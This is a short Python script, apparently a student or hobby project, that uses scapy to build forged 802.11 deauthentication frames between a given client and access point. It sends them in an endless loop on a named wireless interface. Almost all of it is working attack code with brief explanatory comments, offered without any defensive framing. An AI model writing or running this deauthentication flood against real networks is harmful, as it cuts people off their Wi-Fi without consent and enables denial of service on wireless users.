from ast import While
from scapy.all import *
import os
import sys

### Client MAC address
from scapy.layers.dot11 import RadioTap, Dot11Deauth, Dot11

from multiprocessing import Process

client = sys.argv[1]
### AP MAC address
ap = sys.argv[2]
### Interafce name 
interface = "wlo1"

'''
RadioTap()/Dot11(...)/Dot11Deauth() 
addr1: destination MAC address
addr2: source MAC address
addr3: BSSID - AP MAC address
RadioTap is making it easier to transmit information between OSI layers
Dot11 represent the MAC header in the Data Link Layer, it is the abbreviated specification name 802.11
Dot11Deauth represent deauthentication packet
/ - operator that used as a composition operator between two layers
'''

dot11_to_client = Dot11(addr1=client, addr2=ap, addr3=ap)
dot11_to_ap = Dot11(addr1=ap, addr2=client, addr3=ap)

### Deauthentication packet from AP to client.
pkt_to_client = RadioTap() / dot11_to_client / Dot11Deauth(reason=1)

### Deauthentication packet from client to AP.
pkt_to_ap = RadioTap() / dot11_to_ap / Dot11Deauth(reason=1)

print("\n It may take a minute or 2 :) ... \n")   
while True:
    print("Sending deauthentication packet from AP to client")
    sendp(pkt_to_client, inter=0.1, count=100, iface=interface, verbose=1)
    print("Sending deauthentication packet from client to AP")
    sendp(pkt_to_ap, inter=0.1, count=100, iface=interface, verbose=1)